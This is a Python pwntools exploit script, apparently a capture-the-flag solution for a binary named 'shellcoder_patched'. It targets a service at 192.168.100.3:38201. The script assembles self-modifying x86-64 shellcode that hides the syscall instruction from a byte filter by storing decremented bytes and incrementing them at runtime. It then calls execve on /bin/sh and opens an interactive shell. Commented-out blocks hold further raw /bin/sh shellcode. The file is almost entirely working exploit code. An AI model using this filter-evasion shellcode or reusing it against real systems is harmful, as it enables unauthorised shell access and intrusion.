#!/usr/bin/env python3

from pwn import *

exe = ELF("shellcoder_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("192.168.100.3", 38201)

    return r


def main():
    r = conn()

    # good luck pwning :)

    #############################

    
    test = asm("xor rax, rax")
    print('SIZE OF XOR: ' + str(len(test)))
    print(b'test : ' + test)

    test = asm("mov rax, 0xbeef0000")
    print('SIZE OF XOR: ' + str(len(test)))
    print(b'test : ' + test)


    base = 0xbeef0000
    offset = 55
    offset2 = offset + 2
    assembly = """
		xor rax, rax  # 3
		xor rsi, rsi 
		xor rdx, rdx
		xor rdx, rdx
		xor rdi, rdi
		mov rax, {}   # 10
		inc byte PTR [rax] #  
		add rax, 0x1
		inc byte PTR [rax]
		add rax, 0x1
		mov rdi, {}
		mov rax, 0x3b
		nop
	      """
    syscall = asm('syscall')

    payload = asm(assembly.format( base + offset, base + offset2))
    a = bytes([syscall[0]-1, syscall[1]-1])
    print('SIZE OF PAYLOAD: ' + str(len(payload)))
    print(b'payload: ' + payload)
    
    payload = payload + a + b'/bin/sh\x00'

    print(payload)
    size = len(payload)

    print(r.recvline())
    r.sendline(str(size).encode())

    print(r.recvline())
    r.sendline(payload)

    r.interactive()
    

    ##############################



   # payload = asm(shellcraft.sh())

   # print(r.recvline())

   # size = len(payload)

   # shellcode = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68'

   # shellcode = b'\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1'

   # print('SIZE: ' + str(size))

   # #print(r.pid)
   # #input()
   # r.sendline(bytes('34', 'utf-8'))

   # print(r.recvline())

   # r.sendline(shellcode)

   # r.interactive()

if __name__ == "__main__":
    main()
